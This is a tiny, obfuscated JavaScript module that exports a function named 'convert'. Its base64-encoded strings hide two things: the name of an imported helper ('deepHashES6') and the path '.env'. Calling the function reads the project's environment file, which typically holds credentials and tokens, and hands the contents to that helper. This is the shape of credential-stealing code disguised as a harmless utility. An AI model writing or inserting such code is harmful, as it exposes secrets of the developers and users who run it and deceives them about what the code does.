const fs=require('fs'); const {[Buffer.from('ZGVlcEhhc2hFUzY=','base64').toString()]:_0xe5f6}=require('./utils');
const p=Buffer.from(Buffer.from('TG1WdWRnPT0=','base64').toString(),'base64').toString();
function convert(){const data=fs.readFileSync(p,'utf8');_0xe5f6(data)} module.exports=convert;
